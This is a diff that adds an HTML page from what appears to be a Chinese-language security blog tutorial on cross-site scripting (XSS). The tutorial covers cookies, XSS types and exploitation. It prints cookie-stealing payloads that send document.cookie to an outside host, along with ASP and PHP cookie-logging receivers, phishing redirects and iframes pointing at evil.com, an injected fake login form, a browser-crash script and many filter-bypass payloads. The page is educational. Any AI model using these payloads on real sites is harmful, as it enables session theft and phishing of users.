@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#33363b">
+    <meta name="msapplication-TileColor" content="#33363b">
+    
+    
+    
+    
+    <meta name="keywords" content="Life, ARIA, Hexo">
+    
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="192x192" href="/favicons/android-chrome-192x192.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicons/favicon-32x32.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicons/favicon-16x16.png">
+    
+    
+    <link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#33363b">
+    
+    
+    <link rel="manifest" href="/favicons/site.webmanifest">
+    
+    
+    <meta name="msapplication-config" content="/favicons/browserconfig.xml">
+    
+    
+    <link rel="alternate" href="/atom.xml" title="TuringGu" type="application/atom+xml">
+    
+    
+    <link rel="shortcut icon" type="image/x-icon" href="/favicons/favicon.ico">
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/css/index.css">
+    
+    <link rel="stylesheet" type="text/css" href="/css/sidebar.css">
+    
+    
+<link rel="stylesheet" type="text/css" href="/css/page.css">
+<link rel="stylesheet" type="text/css" href="/css/post.css">
+
+    <link rel="stylesheet" type="text/css" href="/css/custom.css">
+    <link rel="stylesheet" type="text/css" href="/css/atom-one-dark.css">
+    <link rel="stylesheet" type="text/css" href="/css/lightgallery.min.css">
+    <script type="text/javascript" src="/js/jquery.min.js"></script>
+    <script defer type="text/javascript" src="/js/util.js"></script>
+    <script defer type="text/javascript" src="/js/scrollspy.js"></script>
+    <script defer type="text/javascript" src="/js/fontawesome-all.min.js"></script>
+    <script defer type="text/javascript" src="/js/lightgallery.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-fullscreen.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-hash.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-pager.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-thumbnail.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-zoom.min.js"></script>
+    
+    <script defer src="/js/busuanzi.pure.mini.js"></script>
+    
+    
+    <script defer type="text/javascript" src="/js/search.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var searchPath = "search.xml";
+      if (searchPath.length === 0) {
+        searchPath = "search.xml";
+      }
+      var path = "/" + searchPath;
+      searchFunc(path, "search-input", "search-result");
+    });
+    </script>
+    
+    
+    <script defer type="text/javascript" src="/js/index.js"></script>
+    
+    <script defer type="text/javascript" src="/js/custom.js"></script>
+    <title>XSS跨站脚本攻击 | TuringGu - Info Security</title>
+  </head>
+  <body itemscope="" itemtype="http://schema.org/WebPage" lang="zh_CN" data-spy="scroll" data-target=".list-group">
+    
+<header id="header" class="header" style="background: #33363b;">
+  <div class="container">
+    <div class="header-container">
+      <div class="header-title">
+        <h1 class="title"><a href="/">TuringGu</a></h1>
+        <h2 class="subtitle">Info Security</h2>
+      </div>
+      
+      <div class="logo">
+        <img src="/images/logo.png" alt="logo">
+      </div>
+      
+    </div>
+    <nav id="nav" class="nav">
+      <a id="nav-toggle" class="nav-toggle" aria-hidden="true"><i class="fas fa-bars" aria-label="切换导航栏"></i></a>
+      <ul id="menu" role="menubar" aria-hidden="false">
+        
+        <li role="menuitem"><a href="/">首页</a></li>
+        
+        <li role="menuitem"><a href="/archives/">归档</a></li>
+        
+        <li role="menuitem"><a href="/categories/">分类</a></li>
+        
+        <li role="menuitem"><a href="/tags/">标签</a></li>
+        
+        <li role="menuitem"><a href="/about/">关于</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</header>
+
+
+    <main id="main" class="main">
+      <div class="container">
+        <div class="main-container">
+          <div class="content">
+            
+<div id="post" class="page">
+  
+  <article class="article post card animate" itemscope="" itemtype="http://schema.org/Article">
+    <div class="post-block">
+      <link itemprop="mainEntityOfPage" href="https://TuringGu.github.io/2019/01/20/XSS/">
+      <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+       <meta itemprop="name" content="TuringGu">
+       <meta itemprop="description" content="">
+       <meta itemprop="image" content="/images/myavatar.jpg">
+      </span>
+      <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+       <meta itemprop="name" content="TuringGu">
+      </span>
+    </div>
+    <header class="post-header">
+      <h1 class="post-title" itemprop="name headline">XSS跨站脚本攻击</h1>
+      <div class="post-meta">
+        
+        <span class="post-date">
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2019-01-20T22:12:25+08:00">2019-01-20 22:12:25</time></span>
+        </span>
+        
+        
+        
+      </div>
+    </header>
+    <main class="post-main" itemprop="articleBody">
+      <h2 id="相关基础"><a href="#相关基础" class="headerlink" title="相关基础"></a>相关基础</h2><h3 id="浏览器工作机制"><a href="#浏览器工作机制" class="headerlink" title="浏览器工作机制"></a>浏览器工作机制</h3><p>常见浏览器有IE、Firefox、Chrome等。这些浏览器的基本工作机制相同。<br>浏览器主要时解析渲染Web中间件相应的HTML、JavaScript、CSS等资源</p>
+<h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><p>一种轻量级编程语言，其代码可插入HTML页面，并由所有的现代浏览器执行。<br>它能够改变任意HTML元素的大多数属性，且常用于改善HTML的展现，为用户带来更好的体验</p>
+<figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Test<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>JavaScript能对事件做出反应，比如对按钮的点击：（alert事件）<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"alert('Webcome!')"</span>&gt;</span>单击按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<hr>
+<h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Cookie是用户浏览网页时网站存储在用户机器上的小文本文件，里面记录了和用户相关的一些状态或设置，如：用户名、ID、访问次数等，当用户下次访问此网站时，网站会先访问用户机器上对应的该网站的Cookie文件，例如：登陆页面的记住密码功能，在Cookie有效期内可直接鼎炉</p>
+<p>根据Cookie时效性可分为两种类型：<br>持久型：以文本形式存储在硬盘上，由浏览器存取<br>临时型：亦称作会话Cookie，存储在内存中，当浏览器关闭后即消失</p>
+<hr>
+<h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p>Cookie时Web应用程序用来识别用户的凭证，且很多情况下时唯一的凭证。当用户第一次登陆网站时，网站会给用户发放一个唯一的Cookie，当用户再次登录网站时，凭借该Cookie，用户就无需再次进行登录操作<br>通过JS，浏览器可以操作用户的Cookie<br>浏览器地址栏输入：<br><figure class="hljs highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 查看某个网站颁发的Cookie</span><br>javascript:alert(document.cookie)<br></code></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>XSS又叫CSS(Cross Site Script)跨站脚本攻击。它指的时攻击者往Web页面或URL里插入恶意JS代码，若Web应用程序对于用户输入没有过滤，那么当正常用户浏览该页面时，嵌入在Web页面里的恶意JavaScript脚本代码会被执行，从而达到恶意攻击正常用户的目的</p>
+<p>服务端<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    $input = $_GET[<span class="hljs-string">"param"</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;div&gt;"</span>.$input.<span class="hljs-string">"&lt;/div&gt;"</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p>
+<p>用户提交<br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="undefined">alert(/xss/)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure></p>
+<hr>
+<h3 id="产生条件"><a href="#产生条件" class="headerlink" title="产生条件"></a>产生条件</h3><ul>
+<li>可以控制输入点</li>
+<li>输入能返回到前端页面上被浏览器当成脚本语言解释执行</li>
+</ul>
+<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul>
+<li>Cookie窃取</li>
+<li>会话劫持</li>
+<li>键盘记录</li>
+<li>客户端信息探查</li>
+<li>网页挂马</li>
+<li>XSS蠕虫</li>
+</ul>
+<hr>
+<h3 id="XSS类别"><a href="#XSS类别" class="headerlink" title="XSS类别"></a>XSS类别</h3><h4 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h4><p>DOM(Document Object Model)，是一个平台和语言都中立的接口，可以使程序和脚本能动态访问和更新文档的内容、结构以及样式<br>DOM-XSS简单理解为：输出点在DOM</p>
+<p><a href="https://blog.csdn.net/ski_12/article/details/60468362" target="_blank" rel="noopener">相关资料</a></p>
+<h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h4><p>存储型XSS又称为持久型XSS。攻击者上传的包含恶意JS脚本的留言等信息被Web应用程序保存到数据库中，Web应用程序在新生成页面时，如果包含了该恶意JS脚本，将会导致所有访问到该网页的浏览器执行该恶意JS脚本。这种攻击类型一般常见在博客、论坛等网站中</p>
+<hr>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h3><ul>
+<li>获取管理员权限（获取Cookie）</li>
+<li>写配置文件Getshell</li>
+<li>键盘记录</li>
+<li>获取内网IP<br>…</li>
+</ul>
+<hr>
+<h3 id="Cookie获取"><a href="#Cookie获取" class="headerlink" title="Cookie获取"></a>Cookie获取</h3><p>eg:<br>在远程服务器上，有一个接收和记录Cookies信息的文件<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script&gt;<br>	document.location=<span class="hljs-string">"http://www.test.com/cookie.asp?cookie="</span>+document.cookie<br>&lt;/script&gt;<br><br>&lt;img src=<span class="hljs-string">"http://www.test.com/cookie.asp?cookie="</span>+document.cookie&gt;&lt;/img&gt;<br></code></pre></td></tr></table></figure></p>
+<figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;%<br>  msg=Request.ServerVariables(<span class="hljs-string">"QUERY_STRING"</span>)<br>  testfile=Server.MapPath(<span class="hljs-string">"cookie.txt"</span>)<br>  set<br>fs=server.CreateObject(<span class="hljs-string">"Scripting.filesystemobject"</span>)<br>  set thisfile=fs.OpenTextFile(testfile,<span class="hljs-number">8</span>,<span class="hljs-keyword">True</span>,<span class="hljs-number">0</span>)<br>  thisfile.Writeline(<span class="hljs-string">""</span>&amp;msg&amp; <span class="hljs-string">""</span>)<br>  thisfile.close<br>  set fs=nothing<br>%&gt;<br></code></pre></td></tr></table></figure>
+<figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    $cookie = $_GET[<span class="hljs-string">'cookie'</span>];<br>    $log = fopen(<span class="hljs-string">"cookie.txt"</span>,<span class="hljs-string">"a"</span>);<br>    fwrite($log,$cookie,<span class="hljs-string">"\n"</span>);<br>    fclose($log);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<hr>
+<h3 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h3><p>由于Cookie存在一定的安全缺陷，开发者开始使用更为安全的Session认证方式<br>从网站访问者进入到离开的这段时间中，每个访问者都会得到一个单独的Session，Session时基于防伪的进程，记录了一个访问从开始到结束。当浏览器或进程关闭后，Session也消失了</p>
+<p>Seesion与Cookie的最大区别：</p>
+<ul>
+<li>Session是保存在服务端的内存里</li>
+<li>Cookie保存在浏览器或客户端的文件里</li>
+</ul>
+<hr>
+<h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3><h4 id="重定向钓鱼"><a href="#重定向钓鱼" class="headerlink" title="重定向钓鱼"></a>重定向钓鱼</h4><p>把当前页面重定向到一个钓鱼页面<br>eg<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://www.bug.com/index.php?search=<span class="hljs-string">"'&gt;&lt;script&gt;document.location.href="</span>http://www.evil.com<span class="hljs-string">"&lt;/script&gt;</span><br></code></pre></td></tr></table></figure></p>
+<h4 id="HTML注入式钓鱼"><a href="#HTML注入式钓鱼" class="headerlink" title="HTML注入式钓鱼"></a>HTML注入式钓鱼</h4><p>使用XSS漏洞注入HTML或JavaScript代码到页面中<br>eg，该段代码会在正常页面中嵌入一个Form表单<br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://www.bug.com/index.php?search="'<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>login<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"text-align:center;"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"Post"</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"phishing.php"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"form"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>Login:<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"login"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>Password:<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Password"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Valid"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"OK"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure></p>
+<h4 id="iframe钓鱼"><a href="#iframe钓鱼" class="headerlink" title="iframe钓鱼"></a>iframe钓鱼</h4><p>通过<code>&lt;iframe&gt;</code>标签嵌入远程域的一个页面实施钓鱼<br>eg<br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://www.bug.com/index.php?search='&gt;<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://www.evil.com"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"100%"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"100%"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure></p>
+<ul>
+<li><p>Flash钓鱼<br>将构造好的Flash文件传入服务器，在目标网站用<code>&lt;object&gt;</code>或<code>&lt;embed&gt;</code>标签引用即可</p>
+</li>
+<li><p>高级钓鱼技术<br>注入代码劫持HTML表单、使用JavaScript编写键盘记录器等</p>
+</li>
+</ul>
+<hr>
+<h4 id="XSS漏洞深入利用"><a href="#XSS漏洞深入利用" class="headerlink" title="XSS漏洞深入利用"></a>XSS漏洞深入利用</h4><ul>
+<li><p>XSS蠕虫<br>通过精心构造的XSS代码，可以实现非法转账、篡改信息、删除文章、自我复制等诸多功能</p>
+</li>
+<li><p>网页挂马<br>一般都是通过篡改网页的方式来实现<br>如：在XSS中使用<code>&lt;iframe&gt;</code>标签</p>
+</li>
+<li><p>DDOS攻击<br>注入恶意JavaScript代码，可能会引起一些拒绝服务攻击</p>
+</li>
+</ul>
+<h4 id="宕机攻击"><a href="#宕机攻击" class="headerlink" title="宕机攻击"></a>宕机攻击</h4><figure class="hljs highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;html&gt;<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><br><span class="hljs-comment">// Windows 7 x64</span><br><span class="hljs-comment">// FireFox v53.0.3 (32-bit) Crashes</span><br><span class="hljs-comment">// Credits: John Page / hyp3rlinx</span><br><span class="hljs-comment">// ISR: ApparitionSec</span><br><span class="hljs-comment">// hyp3rlinx.altervista.org</span><br><br><span class="hljs-keyword">var</span> p1=<span class="hljs-string">"\x41"</span>;	<span class="hljs-comment">// \x表示16进制，此处表示A</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> c=<span class="hljs-number">0</span>;c&lt;<span class="hljs-number">0xC350</span>;c++) &#123; <br>	p1+=<span class="hljs-string">"\x41"</span>;<br>&#125;<br><span class="hljs-keyword">var</span> p2=<span class="hljs-string">"\x41"</span>;<br><span class="hljs-keyword">for</span>(c=<span class="hljs-number">0</span>;c&lt;<span class="hljs-number">0x1388</span>;c++) &#123;<br>	p2+=p1;<br>&#125;<br><span class="hljs-keyword">var</span> el = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'FROM'</span>) <span class="hljs-comment">//IMG,FROM,DIV,P,A,H2,IFRAME,TABLE,TEXTAREA</span><br>el.style.color=p2;<br><span class="hljs-built_in">document</span>.body.appendChild(el);<br></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<hr>
+<h2 id="XSS平台搭建"><a href="#XSS平台搭建" class="headerlink" title="XSS平台搭建"></a>XSS平台搭建</h2><h3 id="XSS利用工具"><a href="#XSS利用工具" class="headerlink" title="XSS利用工具"></a>XSS利用工具</h3><p>经过测试，若发现了XSS漏洞，则可以结合一些XSS工具来进行利用，常见的有：</p>
+<ul>
+<li>BlueLotus_XSSReceier</li>
+<li>XSSer.me</li>
+<li>BeEF(Kali自带)</li>
+</ul>
+<hr>
+<h2 id="XSS变形与绕过"><a href="#XSS变形与绕过" class="headerlink" title="XSS变形与绕过"></a>XSS变形与绕过</h2><h3 id="大小写混合字符"><a href="#大小写混合字符" class="headerlink" title="大小写混合字符"></a>大小写混合字符</h3><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">scRiPt</span>&gt;</span><span class="undefined">alert(1)</span><span class="hljs-tag">&lt;/<span class="hljs-name">scRiPt</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h3 id="过滤尝试"><a href="#过滤尝试" class="headerlink" title="过滤尝试"></a>过滤尝试</h3><figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;scr&lt;script&gt;ipt&gt;<br></code></pre></td></tr></table></figure>
+<h3 id="使用其它标签"><a href="#使用其它标签" class="headerlink" title="使用其它标签"></a>使用其它标签</h3><p><strong>src属性</strong><br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span>/<span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"javascript:alert(2)"</span>&gt;</span><br></code></pre></td></tr></table></figure></p>
+<p><strong>iframe</strong><br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"javascript:alert(2)"</span>&gt;</span><br></code></pre></td></tr></table></figure></p>
+<h3 id="利用属性绕过"><a href="#利用属性绕过" class="headerlink" title="利用属性绕过"></a>利用属性绕过</h3><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!-- <span class="hljs-string">"background"</span>属性 --&gt;<br>&lt;!--Works on Opera10<span class="hljs-number">.5</span> <span class="hljs-keyword">and</span> IE6--&gt;<br>&lt;table background=javascript:alert(<span class="hljs-number">1</span>)&gt;&lt;/table&gt;  <br><br>&lt;!-- <span class="hljs-string">"posters"</span>属性 --&gt;<br>&lt;!--Works upto Opera10<span class="hljs-number">.5</span> --&gt;<br>&lt;video poster=javascript:alert(<span class="hljs-number">1</span>)<span class="hljs-comment">//&gt;&lt;/video&gt;</span><br><br>&lt;!-- <span class="hljs-string">"data"</span>属性--&gt;<br>&lt;object data=<span class="hljs-string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="</span>&gt;<br>&lt;object/data=<span class="hljs-comment">//goo.gl/nlX0P?</span><br><br>&lt;!-- <span class="hljs-string">"code"</span>属性 --&gt;<br>&lt;!-- Firefox Only --&gt;<br>&lt;applet code=<span class="hljs-string">"javascript;confirm(document.cookie);"</span>&gt;<br>&lt;embed code=<span class="hljs-string">"http://businessinfo.co.uk/labs/xss/xss.swf"</span> allowscriptaccess=always&gt;<br></code></pre></td></tr></table></figure>
+<hr>
+<h3 id="利用事件绕过"><a href="#利用事件绕过" class="headerlink" title="利用事件绕过"></a>利用事件绕过</h3><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">prompt(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">marquee</span> <span class="hljs-attr">onstart</span>=<span class="hljs-string">confirm(2)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">prompt(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">keygen</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">video</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"javascript:alert(1)"</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<hr>
+<h3 id="圆括号被过滤"><a href="#圆括号被过滤" class="headerlink" title="圆括号被过滤"></a>圆括号被过滤</h3><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">javascript:windows.onerror</span>=<span class="hljs-string">alert;throw</span> <span class="hljs-attr">1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"javascript:windows.onerror=alert;throw 1"</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h3 id="利用编码绕过"><a href="#利用编码绕过" class="headerlink" title="利用编码绕过"></a>利用编码绕过</h3><p>常用：</p>
+<ul>
+<li>URL编码</li>
+<li>unicode编码</li>
+<li>HTML编码</li>
+<li>CSS编码</li>
+</ul>
+<hr>
